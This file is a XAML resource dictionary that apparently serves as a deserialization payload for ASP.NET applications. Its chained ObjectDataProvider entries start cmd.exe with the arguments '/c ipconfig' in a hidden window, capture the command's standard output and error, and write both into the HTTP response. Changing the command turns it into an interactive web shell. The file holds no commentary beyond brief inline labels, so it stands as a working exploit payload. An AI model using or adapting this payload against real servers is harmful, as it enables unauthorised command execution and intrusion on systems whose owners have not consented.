<ResourceDictionary xmlns='http://schemas.microsoft.com/winfx/2006/xaml/presentation' 
    xmlns:x='http://schemas.microsoft.com/winfx/2006/xaml' 
    xmlns:s='clr-namespace:System;assembly=mscorlib' 
    xmlns:sd='clr-namespace:System.Diagnostics;assembly=System'
    xmlns:w='clr-namespace:System.Web;assembly=System.Web'
    xmlns:pf='clr-namespace:System.Windows.Data;assembly=PresentationFramework'>

    
    <ObjectDataProvider x:Key='a' ObjectInstance='{x:Static w:HttpContext.Current}' MethodName=''></ObjectDataProvider> 
    <ObjectDataProvider x:Key='b' ObjectInstance='{StaticResource a}' MethodName='get_Response'></ObjectDataProvider>
    <ObjectDataProvider x:Key='c' ObjectInstance='{StaticResource b}' MethodName='get_Headers'></ObjectDataProvider>

    
    <!-- Declare array-->
    <s:Array x:Key='arr' x:FactoryMethod='s:Array.CreateInstance'>
      <x:Arguments>
        <x:Type TypeName='s:Char'/>
        <s:Int32>100000</s:Int32>
      </x:Arguments>
    </s:Array>
    <s:Array x:Key='error' x:FactoryMethod='s:Array.CreateInstance'>
      <x:Arguments>
        <x:Type TypeName='s:Char'/>
        <s:Int32>100000</s:Int32>
      </x:Arguments>
    </s:Array>
    

    <!-- Create process-->
    <ObjectDataProvider x:Key='pc' ObjectType = '{x:Type sd:Process}' MethodName = '' ></ObjectDataProvider>


    <!-- Get ProcessStartInfo form Process-->
    <ObjectDataProvider x:Key='startinfo' ObjectInstance='{StaticResource pc}' MethodName='get_StartInfo'></ObjectDataProvider>
    <ObjectDataProvider x:Key='psi1' ObjectInstance='{StaticResource startinfo}' MethodName='set_FileName'>
      <ObjectDataProvider.MethodParameters>
        <s:String>cmd.exe</s:String>
      </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>

    
     <ObjectDataProvider x:Key='psi2' ObjectInstance='{StaticResource startinfo}' MethodName='set_Arguments'>
      <ObjectDataProvider.MethodParameters>
        <s:String>/c ipconfig</s:String>
      </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>

    
    <ObjectDataProvider x:Key='psi3' ObjectInstance='{StaticResource startinfo}' MethodName='set_UseShellExecute'>
      <ObjectDataProvider.MethodParameters>
        <s:Boolean>false</s:Boolean>
      </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>

    
    <ObjectDataProvider x:Key='psi4' ObjectInstance='{StaticResource startinfo}' MethodName='set_RedirectStandardOutput'>
      <ObjectDataProvider.MethodParameters>
        <s:Boolean>true</s:Boolean>
      </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>

    
    <ObjectDataProvider x:Key='psi5' ObjectInstance='{StaticResource startinfo}' MethodName='set_RedirectStandardError'>
      <ObjectDataProvider.MethodParameters>
        <s:Boolean>true</s:Boolean>
      </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>

    
    <ObjectDataProvider x:Key='psi6' ObjectInstance='{StaticResource startinfo}' MethodName='set_CreateNoWindow'>
      <ObjectDataProvider.MethodParameters>
        <s:Boolean>true</s:Boolean>
      </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>

    
    <!-- Start -->
    <ObjectDataProvider x:Key='letstart' ObjectInstance='{StaticResource pc}' MethodName='Start'></ObjectDataProvider>

    
    <!-- Get Output From ReadBlock -->
    <ObjectDataProvider x:Key='readout' ObjectInstance='{StaticResource pc}' MethodName='get_StandardOutput'></ObjectDataProvider>

    
    <ObjectDataProvider x:Key='ro' ObjectInstance='{StaticResource readout}' MethodName='ReadBlock'>
      <ObjectDataProvider.MethodParameters>
        <StaticResource ResourceKey='arr'/>
        <s:Int32>0</s:Int32>
        <s:Int32>100000</s:Int32>
      </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>

    <!-- Get Error From ReadBlock -->
    <ObjectDataProvider x:Key='readerror' ObjectInstance='{StaticResource pc}' MethodName='get_StandardError'></ObjectDataProvider>
    <ObjectDataProvider x:Key='re' ObjectInstance='{StaticResource readerror}' MethodName='ReadBlock'>
      <ObjectDataProvider.MethodParameters>
        <StaticResource ResourceKey='error'/>
        <s:Int32>0</s:Int32>
        <s:Int32>100000</s:Int32>
      </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>


    <!-- WriteToResponse-->
    <ObjectDataProvider x:Key='w' ObjectInstance='{StaticResource b}' MethodName='Write'>
        <ObjectDataProvider.MethodParameters>
        <StaticResource ResourceKey='arr'/>
        <s:Int32>0</s:Int32>
        <s:Int32>100000</s:Int32>
      </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>

    
    <ObjectDataProvider x:Key='vv' ObjectInstance='{StaticResource b}' MethodName='Write'>
      <ObjectDataProvider.MethodParameters>
        <StaticResource ResourceKey='error'/>
        <s:Int32>0</s:Int32>
        <s:Int32>100000</s:Int32>
      </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>

    <ObjectDataProvider x:Key='ee' ObjectInstance='{StaticResource b}' MethodName='End'></ObjectDataProvider>
</ResourceDictionary>
